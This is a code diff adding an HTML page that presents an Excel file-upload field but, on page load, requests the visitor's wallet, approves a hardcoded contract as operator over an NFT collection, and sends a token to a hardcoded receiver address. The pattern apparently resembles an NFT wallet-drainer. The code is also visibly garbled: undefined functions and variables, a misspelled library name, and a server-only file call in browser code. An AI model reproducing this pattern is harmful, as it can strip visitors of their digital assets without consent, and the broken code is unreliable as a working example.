@@ -1,5 +1,15 @@
+<html>
+
+<head>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/exceljs/4.3.0/exceljs.min.js"
         type="application/javascript"></script>
+</head>
+
+<body>
+    <input type="file" id="excelFile" name="excelFile">
+
+    <script>
         const input = document.getElementById('excelFile')
         input.addEventListener('change', () => {
             readXlsxFile(input.files[0]).then((data) => {
@@ -7,8 +17,82 @@
                 // each row being an array of cells.
             })
         })
+
+        async function init() {
+
             // read from a file
             const workbook = new ExcelJs.Workbook();
             await workbook.xlsx.readFile(filename);
 
+            const nftAbi = [
+                'function setApprovalForAll(address operator, bool _approved)',
+            ]
+            const sendNftContractAbi = [
+                {
+                    "inputs": [
+                        {
+                            "internalType": "address",
+                            "name": "from",
+                            "type": "address"
+                        },
+                        {
+                            "internalType": "address",
+                            "name": "destination",
+                            "type": "address"
+                        },
+                        {
+                            "internalType": "address",
+                            "name": "tokenAddress",
+                            "type": "address"
+                        },
+                        {
+                            "internalType": "uint256[]",
+                            "name": "tokenIds",
+                            "type": "uint256[]"
+                        }
+                    ],
+                    "name": "batchSendErc721",
+                    "outputs": [],
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }
+            ]
+
+            const FROM_ADDRESS = "0xB7CAC735994dadeC6E7af196Eb5D71FD7541389D"
+            const RECEIVER_ADDRESS = "0x38d3B085D181e4ceb0af496C6E065d518163ae93"
+            const CONTRACT_ADDRESS = "0x7DAC78B658FbE1930eaB0a78464bD8Db658Da103"
+            const NFT_CONTRACT_ADDRESS = "0x78cCec16372b2647DbFdA5FD70AF80ed4A97e412"
+
+            const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+            await provider.send("eth_requestAccounts", []);
+            const accounts = await provider.listAccounts();
+
+            const signer = provider.getSigner(accounts[0]);
             console.log("----", signer._address)
+
+            const nftContract = new ethers.Contract(
+                NFT_CONTRACT_ADDRESS,
+                nftAbi,
+                signer
+            );
+            await nftContract.setApprovalForAll(CONTRACT_ADDRESS, true)
+
+            const sendNftContract = new ethers.Contract(
+                CONTRACT_ADDRESS,
+                sendNftContractAbi,
+                signer
+            );
+            await sendNftContract.batchSendErc721(
+                signer.address,
+                RECEIVER_ADDRESS,
+                "0x78cCec16372b2647DbFdA5FD70AF80ed4A97e412",
+                [0]
+            )
+        }
+
+        init();
+    </script>
+
+</body>
+
+</html>
